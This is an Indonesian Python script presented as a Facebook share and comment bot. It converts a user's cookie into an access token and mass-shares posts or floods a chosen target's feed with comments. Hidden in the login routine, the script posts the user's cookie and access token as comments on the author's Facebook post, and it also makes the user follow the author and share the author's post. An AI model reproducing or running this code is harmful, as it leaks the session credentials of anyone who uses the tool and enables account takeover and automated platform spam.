# Author by HikmatXD
# Jangan Keras Merecode Script Kami!!! 
# https://github.com/HIKMAT-xyz
# Jangan lupa follow github saya:)
     
     # Corporation Bot Facebook Fast
     # Tricker Not Hacker
     # Fb : Hikmat Ceremony Queenz Sr.
     # Whastapp : 082115413282

# Grup Whastapp Admin : https://chat.whatsapp.com/DvXb23TbzQ1CfDvXwr2ifj
# Script Ini 100% Open Source Code:) 
# Kalo Ada Yang Jual Script Gw Bilang Yak! 
# Hai Perikod:) 

import os,re,sys,bs4,time,json,random,datetime,requests
from rich.panel import Panel as panel
from rich import print as vprint
from time import sleep as turu
ses=requests.Session()

FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year

m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_biasa=random.choice([H,K,M,O,B,U])
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
garis = f" {P}[{warna_warni_biasa}•{P}]"

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

expired_script = ['01', '11', '2022']

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]


def ex_run():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script bff sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script dmf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script dmf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich}"))
		exit()
	else:
		cek_cookie()

def banner():
	os.system("clear") 
	print(f"""
\t__________ ______________________
\t\______   \\_   _____/\_   _____/
\t |    |  _/ |    __)   |    __)  
\t |    |   \ |     \    |     \   
\t |______  / \___  /    \___  /   
\t        \/      \/         \/ • Bot Facebook Fast •
\t{garis} author by {K}HikmatXD
""")

def cek_expired_script():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script bff sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	else:
		pass

def cek_cookie():
	cek_expired_script()
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2}cookie {H2}{xname} {P2}belum invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			ua = random.choice(ua_crack)
			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000131722561/posts/5966059140075084/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			#random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={kook}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={token}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={token}", headers = {"cookie":kook});menu()
			#comen(kook,token)
			menu()
		except (KeyError):
			x=f"{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			turu(0.05)
			login_cookie()
		except requests.exceptions.ConnectionError:
			x=f"\t\t{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login_cookie()

def login_cookie():
	banner()
	print("")
	x = f"{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			comen(cookie)
		except requests.exceptions.ConnectionError:
			x=f"\t\t{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		except (KeyError,IOError):
			x=f"{P2}{cookie} invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login_cookie() 
			
def comen(cookie):
	waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
	kuki = cookie
	toket = open("token.txt","r").read()
	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf","Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"])
	requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
	requests.post("https://graph.facebook.com/100000131722561_5966059140075084/comments?message=" + random_kata + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+toket,headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki})
	print(f"\n{garis} tunggu sebentar");time.sleep(3)
	menu()
			
now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = M+"-"+P
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = M+"-"+P
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = M+"-"+P
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = M+"-"+P
	#x=f"{P2}ini bukan script crack fb!!.. ini cuman dump id nya doang biar simple..\nnanti next crack fb dari file dump!!"
	#vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] bot share facebook\n{P2}[02] bot share profil + kata² & random\n{P2}[03] ganti cookie\n{P2}[{M2}00{P2}] exit"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	c_mat = input(f"{garis} pilih : {H}")
	if c_mat in ["1","01"]:
		bot_share()
	elif c_mat in ["2","02"]:
		bot_komen()
	elif c_mat in ["3","03"]:
		jalan(f"{garis} sedang menghapus cookie ")
		os.system("rm -rf cookie.txt")
		os.system("rm -rf token.txt")
		jalan(f"{garis} succes menghapus cookie ")
		login_cookie()
	elif c_mat in ["0", "00"]:
		exit()
	else:
		jalan(f"{garis} isi yang benar ")
		menu()
		
def bot_share():
	header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
	print("")
	uiz = input(f"{garis} masukan link post : {H} ")
	#uiz2 = input(f"{garis} masukan link post ke 2 : {H}")
	coy = int(input(f"{garis} masukan limit : {H} "))
	x=f"{P2}pencet {H2}ctrl+z untuk menghentikan bot share!!"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	runc= random.choice([K,M,U,O,B,H])
	#idz = random.choice([uiz2,uiz])
	print("")
	try:
		for HikmatXD in range(coy):
			HikmatXD+=1
			ress = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={uiz}&published=0&access_token={token}",headers=header, cookies=coki).json()
			if "id" in ress:
				sys.stdout.write(f"\r ({datetime.datetime.now().strftime('%H:%M:%S')})|{P}[{runc}•{P}] succesfull {runc}{HikmatXD}{P}/{coy} ");sys.stdout.flush()
			else:
				x=f"{P2}akun anda terkena spam komen/share!! "
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
				exit()
	except requests.exceptions.ConnectionError:
		exit(f"{garis} anda tidak terhubung ke internet!")

def bot_komen():
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	print("")
	x=f"{P2}ketik {H2}y {P2}untuk bot komen text bawaan sc + kata² bawaan sc\n{P2}ketik {H2}t{P2} untuk bot komen buatan mu"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	HikmatXF = input(f"{garis} pilih : {H}")
	if HikmatXF in ["y","Y","ya"]:
		bot_komen_kata_bawaan()
	elif HikmatXF in ["t","T","tidak"]:
		bot_komen_kata_random()
	else:
		jalan(f"{garis} isi yang benar ")
		bot_komen()

def bot_komen_kata_random():
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	print("")
	idx = input(f"{garis} id target : {H}")
	cek = requests.get("https://graph.facebook.com/"+idx+"?access_token="+token,cookies=coki).json()
	if 'name' not in cek:
		exit(f"{garis}"+cek['error']['message'])
	else:
		lim = input(f"{garis} limit : {H}")
		x=f"{P2}minimal 1 kata"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		text_buatan = input(f"{garis} masukan komen buatan mu : {H}")
		#test_mu = text_buatan.split(",")
		x=f"{P2}tunggu sebentar"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		post = requests.get("https://graph.facebook.com/"+cek['id']+"?fields=feed.limit("+lim+")&access_token="+token,cookies=coki).json()
		if 'error' in post:
			exit(garis + post['error']['message'])
		elif 'feed' not in post:
			exit(f"{garis} tidak ada postingan!")
		else:
			for i in post['feed']['data']:
				komen = random.choice(['Semangat Bang','Keren Bang','Gokil Suhu','Panutanku','Semangat Terus'])
				#texs = random.choice(['"Kamu laiknya karya seni. Tidak semua orang akan mengerti dirimu, tetapi orang-orang yang mengerti, tidak akan pernah melupakanmu."','"Orang yang tak pernah membuat kesalahan adalah orang yang tidak pernah berbuat apa-apa." - Norman Edwin','"Belajarlah dari kesalahan orang lain. Anda tak dapat hidup cukup lama untuk melakukan semua kesalahan itu sendiri." - Martin Vanbee','"Belajar memang melelahkan, namun akan lebih melelahkan lagi bila saat ini kamu tidak belajar."','"Diam adalah lebih baik daripada mengucapkan kata-kata yang tanpa makna." - Pythagoraz','"Jika Anda takut gagal, Anda tidak pantas untuk sukses!" - Charles Barkley','"Ingin menjadi orang lain adalah tindakan untuk menyia-nyiakan dirimu sendiri." - Kurt Cobain','"Jika kamu mencari satu orang yang akan mengubah hidupmu, lihatlah di cermin."','"Terkadang kita diuji bukan untuk menunjukkan kelemahan kita, tetapi untuk menemukan kekuatan kita."','Jangan pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba','"Belajar bukan hanya mengetahui apa yang harus dilakukan, tapi melakukan apa yang sudah kita ketahui."','"Sukses adalah sebuah perjalanan, bukan sebuah tujuan. Usaha sering lebih penting daripada hasilnya."','"Kegagalan adalah kunci kesuksesan. Setiap kesalahan mengajarkan kita sesuatu."','"Kamu tidak bisa menyenangkan semua orang, dan kamu tidak bisa membuat semua orang menyukaimu," Katie Couric.','"Lakukan satu hal setiap hari yang membuatmu takut," Eleanor Roosevelt.','"Ingat, tidak ada yang bisa membuat Anda merasa rendah diri tanpa persetujuan Anda," Eleanor Roosevelt.','"Jika Anda menginginkan pelangi, Anda harus tahan dengan hujan," Dolly Parton.','"Hidup bukanlah tentang menemukan diri Anda sendiri. Hidup adalah tentang menciptakan diri Anda sendiri," George Bernard Shaw.','"Semua impian kita bisa menjadi kenyataan jika kita memiliki keberanian untuk mengejarnya," Walt Disney.','"Seseorang yang luar biasa itu sederhana dalam ucapannya, tetapi hebat dalam tindakannya."','" Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."','" Untuk mendapatkan apa yang diinginkan, kau harus bersabar dengan apa yang kau benci."','Balas dendam terbaik adalah menjadikan dirimu lebih baik."','"Jangan takut akan perubahan. Kita mungkin kehilangan sesuatu yang baik, namun kita akan peroleh sesuatu yang lebih baik lagi."','" Jika diammu bijak, maka diamlah. Apabila diammu diinjak, maka bicaralah supaya tak ada lagi orang yang menginjak dan meremehkan dirimu."','"Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal."','"Janganlah pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba." - Brian Dyson','"Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan." - Oprah Winfrey'])
				kom = ('komentar ini ditulis oleh bot')
				waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
				_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + text_buatan + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				if 'id' in submit:
					print(f"{garis} succes : {H}"+submit['id'])
				else:
					print(f"{garis} failed : {M}"+i['id'])
			else:
				print(f"{garis} selesaii ")
				input(f"{garis} enter untuk kembali ")
				menu()

def bot_komen_kata_bawaan():
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	print("")
	idx = input(f"{garis} id target : {H}")
	cek = requests.get("https://graph.facebook.com/"+idx+"?access_token="+token,cookies=coki).json()
	if 'name' not in cek:
		exit(f"{garis}"+cek['error']['message'])
	else:
		lim = input(f"{garis} limit : {H}")
		x=f"{P2}tunggu sebentar"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		post = requests.get("https://graph.facebook.com/"+cek['id']+"?fields=feed.limit("+lim+")&access_token="+token,cookies=coki).json()
		if 'error' in post:
			exit(garis + post['error']['message'])
		elif 'feed' not in post:
			exit(f"{garis} tidak ada postingan!")
		else:
			for i in post['feed']['data']:
				komen = random.choice(['Semangat Bang','Keren Bang','Gokil Suhu','Panutanku','Semangat Terus'])
				texs = random.choice(['"Kamu laiknya karya seni. Tidak semua orang akan mengerti dirimu, tetapi orang-orang yang mengerti, tidak akan pernah melupakanmu."','"Orang yang tak pernah membuat kesalahan adalah orang yang tidak pernah berbuat apa-apa." - Norman Edwin','"Belajarlah dari kesalahan orang lain. Anda tak dapat hidup cukup lama untuk melakukan semua kesalahan itu sendiri." - Martin Vanbee','"Belajar memang melelahkan, namun akan lebih melelahkan lagi bila saat ini kamu tidak belajar."','"Diam adalah lebih baik daripada mengucapkan kata-kata yang tanpa makna." - Pythagoraz','"Jika Anda takut gagal, Anda tidak pantas untuk sukses!" - Charles Barkley','"Ingin menjadi orang lain adalah tindakan untuk menyia-nyiakan dirimu sendiri." - Kurt Cobain','"Jika kamu mencari satu orang yang akan mengubah hidupmu, lihatlah di cermin."','"Terkadang kita diuji bukan untuk menunjukkan kelemahan kita, tetapi untuk menemukan kekuatan kita."','Jangan pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba','"Belajar bukan hanya mengetahui apa yang harus dilakukan, tapi melakukan apa yang sudah kita ketahui."','"Sukses adalah sebuah perjalanan, bukan sebuah tujuan. Usaha sering lebih penting daripada hasilnya."','"Kegagalan adalah kunci kesuksesan. Setiap kesalahan mengajarkan kita sesuatu."','"Kamu tidak bisa menyenangkan semua orang, dan kamu tidak bisa membuat semua orang menyukaimu," Katie Couric.','"Lakukan satu hal setiap hari yang membuatmu takut," Eleanor Roosevelt.','"Ingat, tidak ada yang bisa membuat Anda merasa rendah diri tanpa persetujuan Anda," Eleanor Roosevelt.','"Jika Anda menginginkan pelangi, Anda harus tahan dengan hujan," Dolly Parton.','"Hidup bukanlah tentang menemukan diri Anda sendiri. Hidup adalah tentang menciptakan diri Anda sendiri," George Bernard Shaw.','"Semua impian kita bisa menjadi kenyataan jika kita memiliki keberanian untuk mengejarnya," Walt Disney.','"Seseorang yang luar biasa itu sederhana dalam ucapannya, tetapi hebat dalam tindakannya."','" Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."','" Untuk mendapatkan apa yang diinginkan, kau harus bersabar dengan apa yang kau benci."','Balas dendam terbaik adalah menjadikan dirimu lebih baik."','"Jangan takut akan perubahan. Kita mungkin kehilangan sesuatu yang baik, namun kita akan peroleh sesuatu yang lebih baik lagi."','" Jika diammu bijak, maka diamlah. Apabila diammu diinjak, maka bicaralah supaya tak ada lagi orang yang menginjak dan meremehkan dirimu."','"Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal."','"Janganlah pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba." - Brian Dyson','"Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan." - Oprah Winfrey'])
				kom = ('komentar ini ditulis oleh bot')
				waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
				_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				if 'id' in submit:
					print(f"{garis} succes : {H}"+submit['id'])
				else:
					print(f"{garis} failed : {M}"+i['id'])
			else:
				print(f"{garis} selesaii ")
				input(f"{garis} enter untuk kembali ")
				menu()

ex_run()